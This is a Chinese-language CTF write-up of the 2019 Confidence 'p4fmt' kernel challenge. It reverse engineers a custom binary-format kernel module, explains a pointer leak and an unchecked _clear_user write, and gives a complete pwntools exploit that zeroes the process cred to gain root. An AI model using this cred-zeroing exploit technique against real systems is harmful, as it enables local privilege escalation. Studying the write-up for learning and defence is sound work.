---
title: "[Writeups] Teaser Confidence CTF Quals 2019 - p4fmt"
date: 2019-04-26 00:00:00
categories:
- [security, writeups]
tags:
- ctf
- security
- writeups
- pwn
- kernel
---

> Kernel challs are always a bit painful. No internet access, no SSH, no file copying. You’re stuck with copy pasting base64’d (sometimes static) ELFs. But what if there was another solution? We’ve created a lightweight, simple binary format for your pwning pleasure. It’s time to prove your skills.  
> `nc p4fmt.zajebistyc.tf 30002`

| 分數 | 解題人數 |
| :-: | :-: |
| 304 | 10 |

---

## Writeup

題目檔案解壓縮後有三個檔案 `bzImage`, `initramfs.cpio.gz`, `run.sh`

`bzImage` 是壓縮過的 linux kernel  
`initramfs.cpio.gz` 是臨時的檔案系統  
`run.sh` 裡面用 `qemu-system-x86_64` 把 kernel 跑起來

不熟悉 linux kernel debug 可以參考 [Debug Kernel](/old/security/pwn/debug-kernel)

### First Glance

`run.sh` 跑起來後就會跑 linux kernel 彈出一個 shell  
`ls` 一下可以看到三個比較重要的檔案 `init`, `p4fmt.ko`, `flag`  
直接嘗試 `cat flag` 會得到 `Permission denied`
因為我們拿到的使用者是 `pwn` 而 `flag` 只有 `root` 有權限讀  
`init` 裡面有一行 `insmod /p4fmt.ko` 加載 `p4fmt.ko` 這個內核模塊  
看來我們的目標就是利用 `p4fmt.ko` 裡面的漏洞提權拿 root 權限，就可以 `cat flag` 了

### 前置作業

#### 解壓 `initramfs.cpio.gz`

可以先用 `binwalk` 把 `initramfs.cpio.gz` 的檔案系統拉出來

```bash
x initramfs.cpio.gz
binwalk -e initramfs.cpio
```

#### 修改 `init`

```bash
setsid cttyhack su root
```

修改 `init` 讓我們有 root 權限，這樣才看得到 `p4fmt.ko` 內核模塊載入後的位址，等等才方便下斷點  
修改完重新打包 `initramfs.cpio.gz`

```bash
find . -print0 | cpio --null --create --format=newc | gzip --best > ../initramfs.cpio.gz
```

#### 修改 `run.sh`

```bash
-gdb tcp:127.0.0.1:6666
```

開了 gdb server 後，就可以用 gdb 連上去 debug 了  
首先先取得 `p4fmt` 內核模塊的位址  
可以用 `lsmod` 或 `cat /proc/modules` ( 必須有 root 權限 )

```bash gdb
(gdb) target remote :6666
(gdb) add-symbol-file p4fmt.ko 0xffffffffc0288000
(gdb) b load_p4_binary # 這是 p4fmt 主要的函式等等逆向會看到
```

```bash "取得 p4fmt 位址"
/ # lsmod
p4fmt 16384 0 - Live 0xffffffffc0288000 (O)
/ # cat /proc/modules
p4fmt 16384 0 - Live 0xffffffffc0288000 (O)
```

### 逆向

起手式一樣 IDA 打開 ( 好像很多人改用 ghidra 了 O_O )  
但是這次的反編譯有點糟，大部分還是看組語配 gdb  
這個內核模塊主要的功能就是註冊一個新的執行檔格式 ( binary format )  

```c
int __init p4fmt_init (void) {
    _register_binfmt(&p4format, 1);
}

void __exit p4fmt_init (void) {
    unregister_binfmt(&p4format);
}
```

`p4format` 是一個 [`linux_binfmt`](https://elixir.bootlin.com/linux/v5.0/source/include/linux/binfmts.h#L95) 的結構

```c
struct linux_binfmt {
	struct list_head lh;
	struct module *module;
	int (*load_binary)(struct linux_binprm *);
	int (*load_shlib)(struct file *);
	int (*core_dump)(struct coredump_params *cprm);
	unsigned long min_coredump;	/* minimal dump size */
} __randomize_layout;
```

其中的 `load_binary` 這個指標就是指向負責建立環境把程式跑起來的函式  
而在這裡就是指向 `load_p4_binary` 這個函式 ( 一般的 ELF 執行檔是 `load_elf_binary` )  

```c
int load_p4_binary (linux_binprm *bprm) {
    ...
}
```

[`linux_binprm`](https://elixir.bootlin.com/linux/v5.0/source/include/linux/binfmts.h#L17) 會先讀檔案的前 128 bytes 放進 `bprm->buf`  
因為有這個結構有 [`__randomize_layout`](https://lwn.net/Articles/722293/)，所以結構成員的順序是隨機的  
這題的 `bprm->buf` 從 `0x48` 開始 128 bytes，可見下圖  

{% img https://i.imgur.com/XlPKVe1.png 500 'linux_binprm 格式' %}

程式一開始會先檢查前兩個 bytes 是不是 `P4`  
接著檢查第三個 byte 是不是 `\x00`，不是的話會噴 `Unknown version`  
接著第四個 byte 可以是 `\x00` 或 `\x01`，`\x00` 的話會進簡單的路線，`\x01` 會進複雜的路線  
接著四個 bytes 代表後面有幾個 mapping  
接著八個 bytes 代表 mapping 的開頭在 buf 的 offset  
接著八個 bytes 擺的是 entry point 的位址  
其他的部分基本上跟 `load_elf_binary` 一樣

```c simple
vm_mmap(bprm->file, *(QWORD *)(bprm + 0x50), 0x1000, *(QWORD *)(bprm + 0x50) & 7, 2, 0);
```

```c complex
struct p4_mapping {
    long load_addr;
    long length;
    long offset;
};

int mapping_count = *(int *)(bprm->buf + 4);
long mapping_offset = *(long *)(bprm->buf + 8);

p4_mapping *mapping = bprm->buf + mapping_offset;

for (int i = 0; i < mapping_count; i++, mapping++) {
    long addr = mapping->load_addr & 0xFFFFFFFFFFFFF000;
    long prot = mapping->load_addr & 7;

    printk("vm_mmap(load_addr=0x%llx, length=0x%llx, offset=0x%llx, prot=%d)\n", addr, mapping->length, mapping->offset, prot);
    
    if (mapping->load_addr & 8) {
        // 這裡就是要初始化一段記憶體，類似 .bss 段
        vm_mmap(0, addr, mapping->length, prot, 2, mapping->offset);
        printk("clear_user(addr=0x%llx, length=0x%llx)\n", mapping->load_addr, mapping->length);
        _clear_user(mapping->load_addr, mapping->length);
    } else {
        // 這裡是要把檔案掛上去，類似 .text 段
        vm_mmap(bprm->file, addr, mapping->length, prot, 2, mapping->offset);
    }
}
```

### 漏洞

`mapping_count` 改大可以 leak `linux_binprm` 其他欄位的值  
`_clear_user` 沒有檢查，可以把 kernel 上任意位址的值清空  
`linux_binprm` 有一個 `cred` 的結構，裡面存的就是 `uid, gid`  
所以我們只要 leak 出這個 `cred` 的位址，然後用 `_clear_user` 清成 0，我們的程式就是 root 權限了 ( root 的 uid 是 0 )

### 嘗試

```python
#!/usr/bin/env python3
from pwn import *
from base64 import b64encode

context.arch = "amd64"

payload  = b"P4"             # magic
payload += p8(0)             # version
payload += p8(1)             # type
payload += p32(1)            # mapping_count
payload += p64(0x18)         # mapping_offset
payload += p64(0x400030)     # entry

# mapping
payload += flat(
    0x400000 | 7,
    0x1000,
    0
)

payload += asm(shellcraft.echo("test\n") + shellcraft.exit())

print(f'echo {b64encode(payload).decode()} | base64 -d > a ; chmod +x a ; ./a')
```

先寫個簡單的 p4 格式的執行檔測試一下我們的理解是不是對的  

```bash command
echo UDQAAQEAAAAYAAAAAAAAADAAQAAAAAAABwBAAAAAAAAAEAAAAAAAAAAAAAAAAAAASLgBAQEBAQEBAVBIuHVkcnULAQEBSDEEJGoBWGoBX2oFWkiJ5g8FajxYDwU= | base64 -d > a ; chmod +x a ; ./a
```

```bash output
[50353.170813] vm_mmap(load_addr=0x400000, length=0x1000, offset=0x0, prot=7)
test
```

接下來要找 `cred` 的位址，因為 `pwn` 的 `uid` 是 1000 ( = 0x3e8 )  
所以我們把使用者切換成 `pwn`，切成 `pwn` 之後要在 `/tmp` 才可以寫檔  
然後把 `mapping_count` 改大一點，比如 `6`，在他印出的位址指向的值中找 `0x3e8`

```bash
[50800.668734] vm_mmap(load_addr=0x400000, length=0x1000, offset=0x0, prot=7)
[50800.674080] vm_mmap(load_addr=0x10101010101b000, length=0x726475b848500101, offset=0x431480101010b75, prot=0)
[50800.674550] clear_user(addr=0x10101010101b848, length=0x726475b848500101)
[50800.675372] vm_mmap(load_addr=0x6a5f016a58016000, length=0x6a050fe689485a05, offset=0x50f583c, prot=4)
[50800.675786] vm_mmap(load_addr=0x0, length=0x0, offset=0x0, prot=0)
[50800.676003] vm_mmap(load_addr=0x0, length=0x7fffffffef99, offset=0x100000001, prot=0)
[50800.676260] vm_mmap(load_addr=0x0, length=0xffffa1c307595b40, offset=0x0, prot=0)
test
```

找了一找發現在第六個 `vm_mmap` 的 `0xffffa1c307595b40` 這個位址是 `cred`  
但是這個位址每次跑起來都不一樣，不過多跑幾次會發現，這個值會一直循環重複利用，所以只要多跑幾次就會對了

## Final Exploit

```python
#!/usr/bin/env python3
from pwn import *
from base64 import b64encode

context.arch = "amd64"

payload  = b"P4"             # magic
payload += p8(0)             # version
payload += p8(1)             # type
payload += p32(2)            # mapping_count
payload += p64(0x18)         # mapping_offset
payload += p64(0x400048)     # entry

leak_cred = 0xffff9855c758c0c0

# mapping
payload += flat(
    0x400000 | 7,
    0x1000,
    0,

    (leak_cred | 8) + 0x10,
    0x20,
    0
)

payload += asm(shellcraft.cat("/flag") + shellcraft.exit())

print(f'echo {b64encode(payload).decode()} | base64 -d > a ; chmod +x a ; ./a')
```

---

1. https://github.com/david942j/ctf-writeups/tree/master/teaser-confidence-quals-2019/p4fmt
2. https://devcraft.io/2019/03/19/p4fmt-confidence-ctf-2019-teaser.html
3. https://amritabi0s.wordpress.com/2019/03/19/confidence-ctf-p4fmt-write-up/
